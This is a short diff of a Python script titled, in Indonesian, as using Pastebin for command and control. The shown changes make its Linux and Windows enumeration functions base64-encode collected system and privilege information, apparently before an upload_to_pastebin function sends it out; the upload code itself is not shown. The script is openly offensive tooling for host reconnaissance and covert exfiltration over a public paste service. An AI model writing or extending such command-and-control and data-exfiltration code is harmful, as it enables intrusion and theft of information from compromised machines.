@@ -8,7 +8,7 @@ Topic   : PasteBin Sebagai C&C
 
 import os
 import sys
-import socket
+import base64
 import requests
 import subprocess
 from getopt import getopt
@@ -103,7 +103,7 @@ def enum_linux():
         else:
             print(privileges)
     
-    return collected
+    return base64.b64encode(collected.encode()) 
 
 
 def enum_windows():
@@ -141,7 +141,7 @@ def enum_windows():
         else:
             print(user_info_priv)
             
-    return collected
+    return base64.b64encode(collected.encode()) 
 
 
 def upload_to_pastebin():
